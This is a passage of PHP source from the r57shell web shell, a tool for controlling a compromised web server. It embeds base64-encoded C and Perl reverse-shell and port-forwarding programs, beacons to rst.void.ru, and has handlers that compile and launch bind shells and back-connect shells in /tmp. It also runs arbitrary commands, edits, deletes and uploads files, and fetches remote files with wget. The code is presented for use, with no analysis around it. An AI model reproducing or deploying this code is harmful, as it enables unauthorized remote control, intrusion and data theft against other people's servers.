QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
$datapipe_c="I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2
x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb
HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj
aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ
lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm
xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga
W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy
LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV
udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow
0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb
iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l
KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA
gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS
hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC
iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh
ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ
vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC
AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D
QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh
ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0
gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay
wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c
29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy
MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA
gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci
5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ
HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu
dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0
KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC
ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI
E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp
Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs
NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG
J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL
CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp
dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo
gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm
lsZSk7DQogIHJldHVybiAwOw0KfQ==";
$datapipe_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I
CAgICAgPSAkQVJHVlsxXTsNCiRwb3J0ICAgICAgPSAkQVJHVlsyXTsNCiRkYWVtb249MTsNCiRESVIgPSB1bmRlZjsNCiR8ID0gMTsNCmlmICgkZGFl
bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU
gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol
NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC
iRTSUd7J0NITEQnfSA9ICdJR05PUkUnOw0KJG51bSA9IDA7DQp3aGlsZSAoMSkgeyANCiRjaCA9ICRhaC0+YWNjZXB0KCk7IGlmICghJGNoKSB7IHBy
aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ
SICIkIVxuIjsgfSANCmVsc2lmICgkcGlkID09IDApIHsgJGFoLT5jbG9zZSgpOyBSdW4oXCVvLCAkY2gsICRudW0pOyB9IA0KZWxzZSB7ICRjaC0+Y2
xvc2UoKTsgfQ0KfQ0Kc3ViIFJ1biB7DQpteSgkbywgJGNoLCAkbnVtKSA9IEBfOw0KbXkgJHRoID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KCdQZWVyQ
WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN
CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9
yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi
I7DQp2ZWMoJHJpbiwgZmlsZW5vKCRjaCksIDEpID0gMSBpZiAkY2g7DQp2ZWMoJHJpbiwgZmlsZW5vKCR0aCksIDEpID0gMSBpZiAkdGg7DQpteSgkc
m91dCwgJGVvdXQpOw0Kc2VsZWN0KCRyb3V0ID0gJHJpbiwgdW5kZWYsICRlb3V0ID0gJHJpbiwgMTIwKTsNCmlmICghJHJvdXQgICYmICAhJGVvdXQp
IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ
lYygkcm91dCwgZmlsZW5vKCRjaCksIDEpKSkgew0KbXkgJHJlc3VsdCA9IHN5c3JlYWQoJGNoLCAkdGJ1ZmZlciwgMTAyNCk7DQppZiAoIWRlZmluZW
QoJHJlc3VsdCkpIHsNCnByaW50IFNUREVSUiAiJCFcbiI7DQpleGl0IDA7DQp9DQppZiAoJHJlc3VsdCA9PSAwKSB7IGV4aXQgMDsgfQ0KfQ0KaWYgK
CR0aCAgJiYgICh2ZWMoJGVvdXQsIGZpbGVubygkdGgpLCAxKSAgfHwgdmVjKCRyb3V0LCBmaWxlbm8oJHRoKSwgMSkpKSB7DQpteSAkcmVzdWx0ID0g
c3lzcmVhZCgkdGgsICRjYnVmZmVyLCAxMDI0KTsNCmlmICghZGVmaW5lZCgkcmVzdWx0KSkgeyBwcmludCBTVERFUlIgIiQhXG4iOyBleGl0IDA7IH0
NCmlmICgkcmVzdWx0ID09IDApIHtleGl0IDA7fQ0KfQ0KaWYgKCRmaCAgJiYgICR0YnVmZmVyKSB7KHByaW50ICRmaCAkdGJ1ZmZlcik7fQ0Kd2hpbG
UgKG15ICRsZW4gPSBsZW5ndGgoJHRidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJHRoLCAkdGJ1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+I
DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs
ZW4gPSBsZW5ndGgoJGNidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJGNoLCAkY2J1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+IDApIHskY2J
1ZmZlciA9IHN1YnN0cigkY2J1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfX19DQo=";
$c1 = "PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+aG90bG9nX2pzPSIxLjAiO2hvdGxvZ19yPSIiK01hdGgucmFuZG9tKCkrIiZzPTgxNjA2
JmltPTEmcj0iK2VzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrIiZwZz0iK2VzY2FwZSh3aW5kb3cubG9jYXRpb24uaHJlZik7ZG9jdW1lbnQuY29va2l
lPSJob3Rsb2c9MTsgcGF0aD0vIjsgaG90bG9nX3IrPSImYz0iKyhkb2N1bWVudC5jb29raWU/IlkiOiJOIik7PC9zY3JpcHQ+PHNjcmlwdCBsYW5ndW
FnZT0iamF2YXNjcmlwdDEuMSI+aG90bG9nX2pzPSIxLjEiO2hvdGxvZ19yKz0iJmo9IisobmF2aWdhdG9yLmphdmFFbmFibGVkKCk/IlkiOiJOIik8L
3NjcmlwdD48c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0MS4yIj5ob3Rsb2dfanM9IjEuMiI7aG90bG9nX3IrPSImd2g9IitzY3JlZW4ud2lkdGgr
J3gnK3NjcmVlbi5oZWlnaHQrIiZweD0iKygoKG5hdmlnYXRvci5hcHBOYW1lLnN1YnN0cmluZygwLDMpPT0iTWljIikpP3NjcmVlbi5jb2xvckRlcHR
oOnNjcmVlbi5waXhlbERlcHRoKTwvc2NyaXB0PjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQxLjMiPmhvdGxvZ19qcz0iMS4zIjwvc2NyaXB0Pj
xzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPmhvdGxvZ19yKz0iJmpzPSIraG90bG9nX2pzO2RvY3VtZW50LndyaXRlKCI8YSBocmVmPSdodHRwO
i8vY2xpY2suaG90bG9nLnJ1Lz84MTYwNicgdGFyZ2V0PSdfdG9wJz48aW1nICIrIiBzcmM9J2h0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2hv
dGxvZy9jb3VudD8iK2hvdGxvZ19yKyImJyBib3JkZXI9MCB3aWR0aD0xIGhlaWdodD0xIGFsdD0xPjwvYT4iKTwvc2NyaXB0Pjxub3NjcmlwdD48YSB
ocmVmPWh0dHA6Ly9jbGljay5ob3Rsb2cucnUvPzgxNjA2IHRhcmdldD1fdG9wPjxpbWdzcmM9Imh0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2
hvdGxvZy9jb3VudD9zPTgxNjA2JmltPTEiIGJvcmRlcj0wd2lkdGg9IjEiIGhlaWdodD0iMSIgYWx0PSJIb3RMb2ciPjwvYT48L25vc2NyaXB0Pg==";
$c2 = "PCEtLUxpdmVJbnRlcm5ldCBjb3VudGVyLS0+PHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+PCEtLQ0KZG9jdW1lbnQud3JpdGUoJzxh
IGhyZWY9Imh0dHA6Ly93d3cubGl2ZWludGVybmV0LnJ1L2NsaWNrIiAnKw0KJ3RhcmdldD1fYmxhbms+PGltZyBzcmM9Imh0dHA6Ly9jb3VudGVyLnl
hZHJvLnJ1L2hpdD90NTIuNjtyJysNCmVzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrKCh0eXBlb2Yoc2NyZWVuKT09J3VuZGVmaW5lZCcpPycnOg0KJz
tzJytzY3JlZW4ud2lkdGgrJyonK3NjcmVlbi5oZWlnaHQrJyonKyhzY3JlZW4uY29sb3JEZXB0aD8NCnNjcmVlbi5jb2xvckRlcHRoOnNjcmVlbi5wa
XhlbERlcHRoKSkrJzsnK01hdGgucmFuZG9tKCkrDQonIiBhbHQ9ImxpdmVpbnRlcm5ldC5ydTog7+7q4Ofg7e4g9+jx6+4g7/Du8ezu8vDu4iDoIO/u
8eXy6PLl6+XpIOfgIDI0IPfg8eAiICcrDQonYm9yZGVyPTAgd2lkdGg9MCBoZWlnaHQ9MD48L2E+JykvLy0tPjwvc2NyaXB0PjwhLS0vTGl2ZUludGV
ybmV0LS0+";
echo $head;
echo '</head>';
if(empty($_POST['cmd'])) {
$serv = array(127,192,172,10);
$addr=@explode('.', $_SERVER['SERVER_ADDR']);
$current_version = str_replace('.','',$version);
if (!in_array($addr[0], $serv)) {
@print "<img src=\"http://rst.void.ru/r57shell_version/version.php?img=1&version=".$current_version."\" border=0 height=0 width=0>";
@readfile ("http://rst.void.ru/r57shell_version/version.php?version=".$current_version."");}}
echo '<body bgcolor="#e4e0d8"><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc width=160><font face=Verdana size=2>'.ws(1).'&nbsp;
<font face=Webdings size=6><b>!</b></font><b>'.ws(2).'r57shell '.$version.'</b>
</font></td><td bgcolor=#cccccc><font face=Verdana size=-2>';
echo ws(2);
echo "<b>".date ("d-m-Y H:i:s")."</b>";
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpinfo title=\"".$lang[$language.'_text46']."\"><b>phpinfo</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpini title=\"".$lang[$language.'_text47']."\"><b>php.ini</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?cpu title=\"".$lang[$language.'_text50']."\"><b>cpu</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?mem title=\"".$lang[$language.'_text51']."\"><b>mem</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?tmp title=\"".$lang[$language.'_text48']."\"><b>tmp</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?delete title=\"".$lang[$language.'_text49']."\"><b>delete</b></a> ".$rb."<br>";
echo ws(2);
echo (($safe_mode)?("safe_mode: <b><font color=green>ON</font></b>"):("safe_mode: <b><font color=red>OFF</font></b>"));
echo ws(2);
echo "PHP version: <b>".@phpversion()."</b>";
$curl_on = @function_exists('curl_version');
echo ws(2);
echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b>"):("<b><font color=red>OFF</font></b>"));
echo ws(2);
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>ON</font></b>"; } else { echo "<font color=red>OFF</font></b>"; }
echo ws(2);
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo ws(2);
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo ws(2);
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo "<br>".ws(2);
echo "Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_percent = @round(100/($all/$free),2);
echo "<br>".ws(2)."HDD Free : <b>".view_size($free)."</b> HDD Total : <b>".view_size($all)."</b>";
echo '</font></td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td align=right width=100>';
echo $font;
if(!$windows){
echo '<font color=blue><b>uname -a :'.ws(1).'<br>sysctl :'.ws(1).'<br>$OSTYPE :'.ws(1).'<br>Server :'.ws(1).'<br>id :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=Verdana size=-2 color=red><b>";
$uname = ex('uname -a');
echo((!empty($uname))?(ws(3).@substr($uname,0,120)."<br>"):(ws(3).@substr(@php_uname(),0,120)."<br>"));
if(!$safe_mode){
$bsd1 = ex('sysctl -n kern.ostype');
$bsd2 = ex('sysctl -n kern.osrelease');
$lin1 = ex('sysctl -n kernel.ostype');
$lin2 = ex('sysctl -n kernel.osrelease');
}
if (!empty($bsd1)&&!empty($bsd2)) { $sysctl = "$bsd1 $bsd2"; }
else if (!empty($lin1)&&!empty($lin2)) {$sysctl = "$lin1 $lin2"; }
else { $sysctl = "-"; }
echo ws(3).$sysctl."<br>";
echo ws(3).ex('echo $OSTYPE')."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
$id = ex('id');
echo((!empty($id))?(ws(3).$id."<br>"):(ws(3)."user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid()."<br>"));
echo ws(3).$dir;
echo "</b></font>";
}
else
{
echo '<font color=blue><b>OS :'.ws(1).'<br>Server :'.ws(1).'<br>User :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=Verdana size=-2 color=red><b>";
echo ws(3).@substr(@php_uname(),0,120)."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
echo ws(3).@get_current_user()."<br>";
echo ws(3).$dir."<br>";
echo "</font>";
}
echo "</font>";
echo "</td></tr></table>";
if(empty($c1)||empty($c2)) { die(); }
$f = '<br>';
$f .= base64_decode($c1);
$f .= base64_decode($c2);
if(!empty($_POST['cmd']) && $_POST['cmd'] == "find_text")
{
$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \''.$_POST['s_mask'].'\' | xargs grep -E \''.$_POST['s_text'].'\'';
}
if(!empty($_POST['cmd']) && $_POST['cmd']=="ch_")
 {
 switch($_POST['what'])
   {
   case 'own':
   @chown($_POST['param1'],$_POST['param2']);
   break;
   case 'grp':
   @chgrp($_POST['param1'],$_POST['param2']);
   break;
   case 'mod':
   @chmod($_POST['param1'],intval($_POST['param2'], 8));
   break;
   }
 $_POST['cmd']="";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
 {
   switch($_POST['what'])
   {
     case 'file':
      if($_POST['action'] == "create")
       {
       if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],"w")) { echo ce($_POST['mk_name']); $_POST['cmd']=""; }
       else {
        fclose($file);
        $_POST['e_name'] = $_POST['mk_name'];
        $_POST['cmd']="edit_file";
        echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text61']."</b></font></div></td></tr></table>";
        }
       }
       else if($_POST['action'] == "delete")
       {
       if(unlink($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text63']."</b></font></div></td></tr></table>";
       $_POST['cmd']="";
       }
     break;
     case 'dir':
      if($_POST['action'] == "create"){
      if(mkdir($_POST['mk_name']))
       {
         $_POST['cmd']="";
         echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text62']."</b></font></div></td></tr></table>";
       }
      else { echo ce($_POST['mk_name']); $_POST['cmd']=""; }
      }
      else if($_POST['action'] == "delete"){
      if(rmdir($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text64']."</b></font></div></td></tr></table>";
      $_POST['cmd']="";
      }
     break;
   }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="edit_file")
 {
 if(!$file=@fopen($_POST['e_name'],"r+")) { $only_read = 1; @fclose($file); }
 if(!$file=@fopen($_POST['e_name'],"r")) { echo re($_POST['e_name']); $_POST['cmd']=""; }
 else {
 echo $table_up3;
 echo $font;
 echo "<form name=save_file method=post>";
 echo ws(3)."<b>".$_POST['e_name']."</b>";
 echo "<div align=center><textarea name=e_text cols=121 rows=24>";
 echo @htmlspecialchars(@fread($file,@filesize($_POST['e_name'])));
 fclose($file);
 echo "</textarea>";
 echo "<input type=hidden name=e_name value=".$_POST['e_name'].">";
 echo "<input type=hidden name=dir value=".$dir.">";
 echo "<input type=hidden name=cmd value=save_file>";
 echo (!empty($only_read)?("<br><br>".$lang[$language.'_text44']):("<br><br><input type=submit name=submit value=\" ".$lang[$language.'_butt10']." \">"));
 echo "</div>";
 echo "</font>";
 echo "</form>";
 echo "</td></tr></table>";
 exit();
 }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
 {
 if(!$file=@fopen($_POST['e_name'],"w")) { echo we($_POST['e_name']); }
 else {
 @fwrite($file,$_POST['e_text']);
 @fclose($file);
 $_POST['cmd']="";
 echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text45']."</b></font></div></td></tr></table>";
 }
 }
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
{
 cf("/tmp/bd.c",$port_bind_bd_c);
 $blah = ex("gcc -o /tmp/bd /tmp/bd.c");
 @unlink("/tmp/bd.c");
 $blah = ex("/tmp/bd ".$_POST['port']." ".$_POST['bind_pass']." &");
 $_POST['cmd']="ps -aux | grep bd";
}
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="Perl"))
{
 cf("/tmp/bdpl",$port_bind_bd_pl);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/bdpl ".$_POST['port']." &");
 $_POST['cmd']="ps -aux | grep bdpl";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/back",$back_connect);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/back ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="C"))
{
 cf("/tmp/back.c",$back_connect_c);
 $blah = ex("gcc -o /tmp/backc /tmp/back.c");
 @unlink("/tmp/back.c");
 $blah = ex("/tmp/backc ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/dp",$datapipe_pl);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/dp ".$_POST['local_port']." ".$_POST['remote_host']." ".$_POST['remote_port']." &");
 $_POST['cmd']="ps -aux | grep dp";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="C"))
{
 cf("/tmp/dpc.c",$datapipe_c);
 $blah = ex("gcc -o /tmp/dpc /tmp/dpc.c");
 @unlink("/tmp/dpc.c");
 $blah = ex("/tmp/dpc ".$_POST['local_port']." ".$_POST['remote_port']." ".$_POST['remote_host']." &");
 $_POST['cmd']="ps -aux | grep dpc";
}
if (!empty($_POST['alias'])){ foreach ($aliases as $alias_name=>$alias_cmd) { if ($_POST['alias'] == $alias_name){$_POST['cmd']=$alias_cmd;}}}
if (!empty($HTTP_POST_FILES['userfile']['name']))
{
if(isset($_POST['nf1']) && !empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }
else { $nfn = $HTTP_POST_FILES['userfile']['name']; }
@copy($HTTP_POST_FILES['userfile']['tmp_name'],
            $_POST['dir']."/".$nfn)
      or print("<font color=red face=Fixedsys><div align=center>Error uploading file ".$HTTP_POST_FILES['userfile']['name']."</div></font>");
}
if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))
{
 switch($_POST['with'])
 {
 case wget:
 $_POST['cmd'] = which('wget')." ".$_POST['rem_file']." -O ".$_POST['loc_file']."";
 break;
 case fetch:
